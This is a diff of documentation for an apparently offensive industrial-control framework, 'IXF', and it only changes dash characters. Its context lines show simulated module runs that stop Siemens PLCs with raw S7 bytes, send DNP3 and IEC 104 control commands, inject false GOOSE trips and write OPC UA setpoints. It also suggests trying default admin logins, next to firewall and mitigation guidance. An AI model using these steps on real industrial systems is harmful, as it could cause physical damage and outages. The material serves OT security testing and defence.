@@ -4,7 +4,7 @@ IXF covers 50+ industrial protocols and 150+ OT/ICS vendors worldwide with scan,
 
 ---
 
-## `protocols` Command — Full Output
+## `protocols` Command - Full Output
 
 ```
 ixf > protocols
@@ -13,7 +13,7 @@ ixf > protocols
   ═══════════════════════════════════════════════════════════════════════════
   #   Protocol                  Port(s)          Type         Region/Usage
   ─────────────────────────────────────────────────────────────────────────
-  01  Modbus TCP                502/TCP          App          Global — PLCs, SCADA
+  01  Modbus TCP                502/TCP          App          Global - PLCs, SCADA
   02  Modbus RTU                Serial/gateway   App          Serial devices
   03  Siemens S7comm            102/TCP          App          Siemens S7-200/300/400
   04  Siemens S7comm+           102/TCP          App          Siemens S7-1200/1500 TLS
@@ -68,7 +68,7 @@ ixf > protocols
 
 ---
 
-## Protocol Reference Table — All 50 Protocols
+## Protocol Reference Table - All 50 Protocols
 
 | # | Protocol | IEC/IEEE Standard | Default Port(s) | Protocol Type | Use in OT | IXF Module Paths | Example Use Case |
 |---|----------|-------------------|-----------------|---------------|-----------|------------------|------------------|
@@ -129,14 +129,14 @@ ixf > protocols
 
 ### 1. Modbus TCP
 
-**Description:** Modbus is the most widely deployed industrial communication protocol globally. Originally developed by Modicon in 1979 for serial communication over RS-232, Modbus TCP wraps the Modbus Application Protocol (MBAP) over standard TCP/IP. It is completely unauthenticated by design — any host on the network can read or write coils, registers, and discrete inputs.
+**Description:** Modbus is the most widely deployed industrial communication protocol globally. Originally developed by Modicon in 1979 for serial communication over RS-232, Modbus TCP wraps the Modbus Application Protocol (MBAP) over standard TCP/IP. It is completely unauthenticated by design - any host on the network can read or write coils, registers, and discrete inputs.
 
 **History:** The protocol predates OT cybersecurity concerns by decades. There is no authentication, encryption, or integrity protection in the base specification. Extensions such as Modbus Security (RFC 8605) exist but are rarely deployed.
 
 **Security Issues:**
-- No authentication — any client can read/write any register
-- No encryption — all data transmitted in plaintext
-- No integrity protection — replay and injection attacks are trivial
+- No authentication - any client can read/write any register
+- No encryption - all data transmitted in plaintext
+- No integrity protection - replay and injection attacks are trivial
 - Function code 8 (Diagnostics) can restart devices
 - FC43 (MEI) leaks device identification (vendor, product, firmware)
 
@@ -185,7 +185,7 @@ ixf (Modbus TCP Unauthorized Coil Set) > set coil_value 1
 
 ixf (Modbus TCP Unauthorized Coil Set) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   ═══════════════════════════════════════════════════════════════════════════
   Module:  Modbus TCP Unauthorized Coil Set
   Target:  192.168.1.100:502  Unit ID: 1
@@ -205,8 +205,8 @@ ixf (Modbus TCP Unauthorized Coil Set) > run
 
 ixf (Modbus TCP Unauthorized Coil Set) > check
 [*] Checking 192.168.1.100:502...
-[+] REACHABLE — TCP 502 open
-[+] MODBUS DEVICE DETECTED — FC4 response received, Transaction ID echoed
+[+] REACHABLE - TCP 502 open
+[+] MODBUS DEVICE DETECTED - FC4 response received, Transaction ID echoed
 [+] Unit ID 1 responded. FC4 Input Register[0] = 0x0043
 ```
 
@@ -218,7 +218,7 @@ ixf (Modbus TCP Unauthorized Coil Set) > check
 
 **Security Issues:**
 - S7comm: no authentication, no encryption, full read/write access
-- S7comm+: TLS with hardcoded key — decryptable by any attacker (CVE-2021-22681)
+- S7comm+: TLS with hardcoded key - decryptable by any attacker (CVE-2021-22681)
 - CPU START/STOP commands require no credentials
 - Program upload/download unauthenticated on older firmware
 - FC43 (MEI equivalent) leaks firmware version and hardware info
@@ -259,14 +259,14 @@ ixf (Siemens S7comm CPU Stop Command) > set target 192.168.1.55
 
 ixf (Siemens S7comm CPU Stop Command) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   ═══════════════════════════════════════════════════════════════════════════
   Module:  Siemens S7comm CPU Stop Command
   Target:  192.168.1.55:102  Rack: 0  Slot: 1
 
   Step 1: Establish ISO-on-TCP connection (TPKT + COTP CR)
   Step 2: Send S7comm Setup Communication PDU (negotiation)
-  Step 3: Send S7comm CPU Control — STOP command:
+  Step 3: Send S7comm CPU Control - STOP command:
           TPKT: 03 00 00 21
           COTP: 02 F0 80
           S7: 32 01 00 00 00 00 00 10 00 00 28 00 00 00 00 00
@@ -289,7 +289,7 @@ ixf (Siemens S7comm CPU Stop Command) > run
 
 **Security Issues:**
 - CIP does not require authentication for tag reads/writes in basic mode
-- The Identity Object (Class 0x01) is always readable — leaks model, vendor, firmware
+- The Identity Object (Class 0x01) is always readable - leaks model, vendor, firmware
 - Unregistered sessions can still enumerate tags in some firmware versions
 - Forward Open requests can establish implicit I/O connections without auth
 - CIP Safety (GuardLogix) has OUNID spoofing risks
@@ -317,7 +317,7 @@ ixf (EtherNet/IP CIP Scanner) > set target 192.168.1.0/24
 
 ixf (EtherNet/IP CIP Scanner) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  EtherNet/IP CIP Scanner
   Target:  192.168.1.0/24
 
@@ -337,12 +337,12 @@ ixf (EtherNet/IP CIP Scanner) > run
 
 ### 4. DNP3
 
-**Description:** DNP3 (Distributed Network Protocol 3) is widely used in electric utilities (power grid RTUs, substations) and water/wastewater SCADA systems. Defined in IEEE 1815-2012. DNP3 has a DIRECT OPERATE (DO) function that can directly control field devices — breakers, valves, pumps — without a handshake. DNP3 Secure Authentication version 5 (SAv5) was added in 2012 but deployment remains limited.
+**Description:** DNP3 (Distributed Network Protocol 3) is widely used in electric utilities (power grid RTUs, substations) and water/wastewater SCADA systems. Defined in IEEE 1815-2012. DNP3 has a DIRECT OPERATE (DO) function that can directly control field devices - breakers, valves, pumps - without a handshake. DNP3 Secure Authentication version 5 (SAv5) was added in 2012 but deployment remains limited.
 
 **Security Issues:**
 - DIRECT OPERATE commands require no authentication in base DNP3
 - SELECT BEFORE OPERATE can be replayed without SAv5
-- No encryption — all SCADA data (setpoints, alarms, events) in plaintext
+- No encryption - all SCADA data (setpoints, alarms, events) in plaintext
 - SAv5 implementation varies widely; many RTUs claim SAv5 support but have gaps
 - Sequence number rollover can enable replay attacks
 
@@ -378,7 +378,7 @@ ixf (DNP3 DIRECT OPERATE Binary Output) > set outstation_addr 10
 
 ixf (DNP3 DIRECT OPERATE Binary Output) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  DNP3 DIRECT OPERATE Binary Output
   Target:  10.0.0.101:20000
   Master:  1  Outstation: 10  Point: 0  Op: LATCH_ON
@@ -417,7 +417,7 @@ ixf (BACnet/IP Device Scanner) > set target 192.168.1.0/24
 
 ixf (BACnet/IP Device Scanner) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  BACnet/IP Device Scanner
   Target:  192.168.1.0/24
 
@@ -447,7 +447,7 @@ ixf (BACnet/IP Device Scanner) > run
 
 ### 6. IEC 60870-5-104
 
-**Description:** IEC 104 (IEC 60870-5-104) is the TCP/IP variant of IEC 60870-5-101, used for power grid SCADA: control centers communicating with remote terminal units (RTUs) in substations and distribution networks. The protocol carries ASDU (Application Service Data Units) that can send control commands (ASDU type 45/46/47/48 — single/double point commands, step commands) to field devices.
+**Description:** IEC 104 (IEC 60870-5-104) is the TCP/IP variant of IEC 60870-5-101, used for power grid SCADA: control centers communicating with remote terminal units (RTUs) in substations and distribution networks. The protocol carries ASDU (Application Service Data Units) that can send control commands (ASDU type 45/46/47/48 - single/double point commands, step commands) to field devices.
 
 **Example Usage:**
 
@@ -461,7 +461,7 @@ ixf (IEC 60870-5-104 ASDU Command Injection) > set target 10.10.0.20
 
 ixf (IEC 60870-5-104 ASDU Command Injection) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  IEC 60870-5-104 ASDU Command Injection
   Target:  10.10.0.20:2404
 
@@ -484,7 +484,7 @@ ixf (IEC 60870-5-104 ASDU Command Injection) > run
 
 ### 7. IEC 61850 / GOOSE
 
-**Description:** IEC 61850 is the standard for substation communication and automation. It covers MMS (Manufacturing Message Specification) over TCP/102 for SCADA-to-IED communication, and GOOSE (Generic Object Oriented Substation Event) for peer-to-peer L2 multicast between protection relays. GOOSE is used for fast protection interlocking (under 4ms). GOOSE has no authentication by default — any attacker on the substation LAN can inject false GOOSE trip messages. IEC 62351-6 adds HMAC-SHA256 authentication to GOOSE.
+**Description:** IEC 61850 is the standard for substation communication and automation. It covers MMS (Manufacturing Message Specification) over TCP/102 for SCADA-to-IED communication, and GOOSE (Generic Object Oriented Substation Event) for peer-to-peer L2 multicast between protection relays. GOOSE is used for fast protection interlocking (under 4ms). GOOSE has no authentication by default - any attacker on the substation LAN can inject false GOOSE trip messages. IEC 62351-6 adds HMAC-SHA256 authentication to GOOSE.
 
 **Example Usage:**
 
@@ -513,7 +513,7 @@ ixf (IEC 61850 GOOSE False Trip Injection) > show options
 
 ixf (IEC 61850 GOOSE False Trip Injection) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  IEC 61850 GOOSE False Trip Injection
   Interface: eth0
 
@@ -550,15 +550,15 @@ ixf (OPC UA Anonymous Write) > set target 192.168.1.200
 
 ixf (OPC UA Anonymous Write) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Module:  OPC UA Anonymous Write
   Target:  192.168.1.200:4840
 
   Step 1: Send OPC UA Hello message (HEL)
   Step 2: Send OPC UA OpenSecureChannel with SecurityMode=None
-  Step 3: GetEndpoints — list all server endpoints including None-security
+  Step 3: GetEndpoints - list all server endpoints including None-security
   Step 4: CreateSession with Anonymous identity token
-  Step 5: Browse root namespace — list all nodes and tag names
+  Step 5: Browse root namespace - list all nodes and tag names
   Step 6: Write to target node: NodeId ns=2;i=1003 (example: Tank Level Setpoint)
           WriteValue: Value=0.0 (drain setpoint)
 
@@ -582,7 +582,7 @@ ixf (MQTT Anonymous Subscribe All Topics) > set target 10.0.0.5
 
 ixf (MQTT Anonymous Subscribe All Topics) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect MQTT to 10.0.0.5:1883 with no credentials
   Step 2: Subscribe to wildcard topic '#' (all topics)
   Step 3: Collect all published messages:
@@ -611,7 +611,7 @@ ixf (PROFINET DCP Identify Flood) > set interface eth0
 
 ixf (PROFINET DCP Identify Flood) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Craft PROFINET DCP Identify All request
           EtherType: 0x8892
           FrameID: 0xFEFE (DCP Identify All)
@@ -643,12 +643,12 @@ ixf (OPC DA Tag Enumeration via DCOM) > set target 192.168.1.10
 
 ixf (OPC DA Tag Enumeration via DCOM) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Enumerate DCOM objects via RPC EndpointMapper (port 135)
   Step 2: Find OPC DA server ProgID: 'RSLinx.Application' or 'Kepware.KepServerEX.V6'
   Step 3: CreateInstance OPC Server object
-  Step 4: IOPCServer::BrowseOPCItemIDs — enumerate all tag names and branches
-  Step 5: IOPCServer::ValidateItems — validate accessible items
+  Step 4: IOPCServer::BrowseOPCItemIDs - enumerate all tag names and branches
+  Step 5: IOPCServer::ValidateItems - validate accessible items
   Step 6: Report all tag names, data types, access rights
 ```
 
@@ -656,7 +656,7 @@ ixf (OPC DA Tag Enumeration via DCOM) > run
 
 ### 12. Omron FINS
 
-**Description:** FINS (Factory Interface Network Service) is Omron's proprietary network protocol for CS/CJ/CP/NX/NJ series PLCs and CX-Programmer communication. FINS UDP runs on port 9600. FINS has no authentication — any host that can reach UDP/9600 can send FINS commands. The Memory Area Read command allows reading any PLC memory area (DM, I/O, HR, TIM, CNT, EM, EM extended).
+**Description:** FINS (Factory Interface Network Service) is Omron's proprietary network protocol for CS/CJ/CP/NX/NJ series PLCs and CX-Programmer communication. FINS UDP runs on port 9600. FINS has no authentication - any host that can reach UDP/9600 can send FINS commands. The Memory Area Read command allows reading any PLC memory area (DM, I/O, HR, TIM, CNT, EM, EM extended).
 
 **Example Usage:**
 
@@ -669,7 +669,7 @@ ixf (Omron FINS Memory Area Read) > set target 192.168.1.150
 
 ixf (Omron FINS Memory Area Read) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Send FINS/UDP command (Memory Area Read):
           ICF: 80  RSV: 00  GCT: 02  DNA: 00  DA1: 00  DA2: 00
           SNA: 00  SA1: 08  SA2: 00
@@ -698,7 +698,7 @@ ixf (Beckhoff ADS Variable Write) > set target 192.168.1.80
 
 ixf (Beckhoff ADS Variable Write) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect TCP to 192.168.1.80:48898
   Step 2: Build AMS/TCP header: Net ID 192.168.1.80.1.1, Port 851 (PLC runtime)
   Step 3: ADS Write command: Index Group=0x4020 (data area), Index Offset=var_offset
@@ -724,7 +724,7 @@ ixf (Unitronics PCOM Scanner) > set target 192.168.1.0/24
 
 ixf (Unitronics PCOM Scanner) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: TCP connect to each host on port 20256
   Step 2: Send PCOM Info Request frame:
           /OPLC_UNIT_ID CC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \r
@@ -753,7 +753,7 @@ ixf (KNX Group Address Write) > set group_address "1/0/1"
 
 ixf (KNX Group Address Write) > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Send KNXnet/IP Tunneling Request to 192.168.1.250:3671
   Step 2: CEMI L_DATA.REQ with:
           Priority: Normal
@@ -787,12 +787,12 @@ ixf (KNX Group Address Write) > run
 
 ---
 
-## `vendors` Command — Full Output
+## `vendors` Command - Full Output
 
 ```
 ixf > vendors
 
-  IXF Vendor Coverage — 150 Vendors
+  IXF Vendor Coverage - 150 Vendors
   ═══════════════════════════════════════════════════════════════════════════
   Vendor                               Region      CVE Modules
   ─────────────────────────────────────────────────────────────────────────
@@ -895,7 +895,7 @@ ixf > vendors
   ═══════════════════════════════════════════════════════════════════════════
 
 ixf > vendors europe
-  Vendors — Europe (26 covered)
+  Vendors - Europe (26 covered)
   ─────────────────────────────────────────────────────────────────────────
   Siemens            Germany      27 CVE modules
   Schneider Electric France       39 CVE modules
@@ -925,7 +925,7 @@ ixf > vendors europe
   Sofrel             France        1 CVE modules
 
 ixf > vendors americas
-  Vendors — Americas (31 covered)
+  Vendors - Americas (31 covered)
   ─────────────────────────────────────────────────────────────────────────
   Rockwell Automation  USA          38 CVE modules
   Honeywell            USA          20 CVE modules
@@ -960,7 +960,7 @@ ixf > vendors americas
   Digicon              Brazil        1 CVE modules
 
 ixf > vendors asia
-  Vendors — Asia-Pacific (24 covered)
+  Vendors - Asia-Pacific (24 covered)
   ─────────────────────────────────────────────────────────────────────────
   Yokogawa          Japan          5 CVE modules
   Omron             Japan         12 CVE modules
@@ -990,7 +990,7 @@ ixf > vendors asia
 
 ---
 
-## Vendor Coverage Tables — Complete Reference
+## Vendor Coverage Tables - Complete Reference
 
 ### Europe
 
@@ -1188,7 +1188,7 @@ A consolidated security posture reference for all 50 protocols:
 
 ---
 
-## Protocol Port Reference — Quick Lookup
+## Protocol Port Reference - Quick Lookup
 
 | Port | Protocol | Transport | Notes |
 |------|---------|-----------|-------|
@@ -1229,7 +1229,7 @@ ixf > set target 192.168.1.1    # gateway IP
 ixf > set slave_addr 3          # PROFIBUS slave address
 ixf > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect to gateway TCP on 192.168.1.1
   Step 2: Send PROFIBUS DP diagnostic request to slave 3
   Step 3: Read parameter block (PROFIBUS DP slot 0, index 0)
@@ -1255,7 +1255,7 @@ ixf > set target 10.0.0.5    # HSE linking device IP
 ixf > set tag "FI-1001/AI1/PV"
 ixf > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect to HSE linking device (TCP 1089)
   Step 2: Send FF HSE SetValue PDU for function block FI-1001 AI1
   Step 3: Write PV value override to 0.0 (process variable forced)
@@ -1266,7 +1266,7 @@ ixf > run
 
 ## Protocol Example 23: LonWorks / LonTalk
 
-**Description:** LonWorks (Local Operating Network) is used in building automation (street lighting, HVAC, metering) and some transportation systems. LonWorks uses the LonTalk protocol over twisted pair, power line, or IP (LonWorks/IP, port 1628 UDP). The LonWorks Wink command causes devices to flash their LED for identification — an adversary can use this to enumerate all devices or to disrupt operations via a rapid wink storm.
+**Description:** LonWorks (Local Operating Network) is used in building automation (street lighting, HVAC, metering) and some transportation systems. LonWorks uses the LonTalk protocol over twisted pair, power line, or IP (LonWorks/IP, port 1628 UDP). The LonWorks Wink command causes devices to flash their LED for identification - an adversary can use this to enumerate all devices or to disrupt operations via a rapid wink storm.
 
 **IXF Example:**
 
@@ -1275,7 +1275,7 @@ ixf > use exploits/protocols/lonworks/lon_wink
 ixf > set target 192.168.50.1    # LonWorks/IP router
 ixf > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Send LonWorks/IP UDP datagram to 192.168.50.1:1628
   Step 2: Encode LonTalk Wink command (Network Variable output)
   Step 3: All LonWorks devices on this channel respond/flash
@@ -1296,7 +1296,7 @@ ixf > use scanners/ics/hsms_scanner
 ixf > set target 10.100.1.0/24
 ixf > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect TCP to each host:5000
   Step 2: Send HSMS Select.req (session selection)
   Step 3: Send S1F1 (Are You There)
@@ -1322,7 +1322,7 @@ ixf > use scanners/ics/serial_to_ethernet_scanner
 ixf > set target 192.168.1.0/24
 ixf > run
 
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   Step 1: Connect to port 4001 (Moxa NPort default serial port 1)
   Step 2: Send Moxa discovery broadcast (UDP 4800)
   Step 3: Parse discovery response:
@@ -1332,7 +1332,7 @@ ixf > run
           Serial Ports: 4 (all mapped to TCP)
   Step 4: TCP/4001 provides raw serial access to connected RS-232/RS-485 devices
   [i] Connect to port 4001, then send Modbus RTU or DNP3 serial frames directly
-  [i] Web console typically on port 80 — test for default admin/(blank)
+  [i] Web console typically on port 80 - test for default admin/(blank)
 ```
 
 ---
@@ -1387,7 +1387,7 @@ Understanding which OT protocols have built-in security controls vs. those that 
 |----------|---------------|-----------|-----------|---------------|------------------|
 | Modbus TCP | None | None | None | None | No security (by design) |
 | Modbus RTU | None | None | CRC only | None | No security |
-| Siemens S7comm | None (v1/v2/v3) | None | Partial | None | No auth — known issue |
+| Siemens S7comm | None (v1/v2/v3) | None | Partial | None | No auth - known issue |
 | Siemens S7comm+ | TLS (cert-based) | TLS 1.2+ | TLS HMAC | Partial | CVE-2021-22681 (hardcoded key) |
 | EtherNet/IP / CIP | Optional (FactoryTalk) | Optional TLS | Optional | CIP Safety | ODVA security extensions |
 | PROFINET DCP | None | None | None | None | Relies on L2 isolation |
@@ -1399,7 +1399,7 @@ Understanding which OT protocols have built-in security controls vs. those that 
 | OPC UA | Certificate + username | TLS | TLS | Full | OPC UA Security (IEC 62541) |
 | OPC DA (DCOM) | Windows NTLM/Kerberos | Optional | NTLM | None | Windows AD security |
 | MQTT | Optional username/TLS | Optional TLS | TLS/HMAC | None | MQTT v5 enhanced auth |
-| SNMP v1/v2c | Community string | None | None | None | Deprecated — use SNMPv3 |
+| SNMP v1/v2c | Community string | None | None | None | Deprecated - use SNMPv3 |
 | SNMP v3 | Username + HMAC | DES/AES | HMAC-MD5/SHA | None | RFC 3410/3412 |
 | CANopen | None | None | None | None | Physical layer security only |
 | EtherCAT | None | None | None | FSoE (safety) | Physical: L2 isolated |
@@ -1418,7 +1418,7 @@ Understanding which OT protocols have built-in security controls vs. those that 
 Complete port list for ICS firewall policy:
 
 ```
-# ICS protocol ports — firewall rule reference
+# ICS protocol ports - firewall rule reference
 # ALLOW (inbound to OT, only from approved sources)
 tcp  502        Modbus TCP               # Source: SCADA servers only
 tcp  102        S7comm, IEC 61850 MMS   # Source: Engineering WS only
@@ -1437,14 +1437,14 @@ tcp  5450       OSIsoft PI Server       # Source: Historian clients
 tcp  5457,5461  AVEVA Historian         # Source: Historian clients
 tcp  4911       Tridium Niagara         # Source: Engineering WS only
 tcp  8088       Inductive Automation    # Source: SCADA clients only
-tcp  1502       Triconex (SIS)          # Source: SIS engineering only — HIGH RISK if open
+tcp  1502       Triconex (SIS)          # Source: SIS engineering only - HIGH RISK if open
 
 # DENY (block all from untrusted sources)
-tcp  23         Telnet                  # Block entirely — use SSH only
-tcp  21         FTP                     # Block entirely — use SFTP
+tcp  23         Telnet                  # Block entirely - use SSH only
+tcp  21         FTP                     # Block entirely - use SFTP
 tcp  80         HTTP (OT mgmt)          # Block from internet; internal only
-tcp  135        DCOM (OPC DA)           # Block from untrusted — allow WS only
-tcp  3389       RDP                     # Block — use jump server
+tcp  135        DCOM (OPC DA)           # Block from untrusted - allow WS only
+tcp  3389       RDP                     # Block - use jump server
 udp  53         DNS from OT             # Redirect to internal DNS only
 tcp  445        SMB                     # Block outbound from OT (NotPetya prevention)
 ```
@@ -1526,11 +1526,11 @@ Which vendors use which protocols (common combinations):
 
 Modbus TCP (port 502) is the most widely exploited ICS protocol because:
 
-1. **No authentication** — any device can send any command
-2. **No encryption** — all data in cleartext (ARP/MITM trivial)
-3. **No authorization** — read/write are equally accessible to all clients
-4. **Broadcast capable** — unit ID 0 reaches all Modbus devices
-5. **No session concept** — stateless; no login/logout
+1. **No authentication** - any device can send any command
+2. **No encryption** - all data in cleartext (ARP/MITM trivial)
+3. **No authorization** - read/write are equally accessible to all clients
+4. **Broadcast capable** - unit ID 0 reaches all Modbus devices
+5. **No session concept** - stateless; no login/logout
 
 ### Common Modbus Attacks Covered by IXF
 
@@ -1550,12 +1550,12 @@ Modbus TCP (port 502) is the most widely exploited ICS protocol because:
 
 Since Modbus has no built-in security, compensating controls are required:
 
-- **Network segmentation** — restrict port 502 access to SCADA servers only
-- **Modbus firewall** (Modbus-aware DPI) — filter by unit ID, FC, register range
-- **Unidirectional gateways** — data diode for historian reads
-- **IDS/NDR** (Claroty/Nozomi) — baseline normal Modbus patterns; alert on deviations
-- **Encrypted tunnel** (Modbus over TLS/VPN) — for remote access
-- **OPC UA migration** — replace Modbus TCP with OPC UA (authentication + encryption)
+- **Network segmentation** - restrict port 502 access to SCADA servers only
+- **Modbus firewall** (Modbus-aware DPI) - filter by unit ID, FC, register range
+- **Unidirectional gateways** - data diode for historian reads
+- **IDS/NDR** (Claroty/Nozomi) - baseline normal Modbus patterns; alert on deviations
+- **Encrypted tunnel** (Modbus over TLS/VPN) - for remote access
+- **OPC UA migration** - replace Modbus TCP with OPC UA (authentication + encryption)
 
 ---
 
